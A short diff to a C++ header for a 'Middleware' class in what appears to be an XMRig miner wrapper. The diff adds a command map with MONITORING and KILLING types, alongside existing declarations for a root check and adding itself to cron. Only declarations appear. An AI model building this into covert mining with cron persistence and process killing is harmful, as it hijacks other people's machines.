@@ -34,6 +34,7 @@
 #include <sys/stat.h> 
 #include <string>
 #include <sstream>
+#include <unordered_map>
 
 class Middleware {
 public:
@@ -42,6 +43,14 @@ public:
 	bool isLaunchedAsRoot();
 	bool sanitizeProgramArgs(ProgramArgs* args);
 	void addToCron();
+private:
+	enum CommandType {
+		MONITORING,
+		KILLING,
+		OTHER
+	};
+
+	std::unordered_map<std::string, CommandType> commandMap;
 };
 
 #endif /* XMRIG_MIDDLEWARE_H */
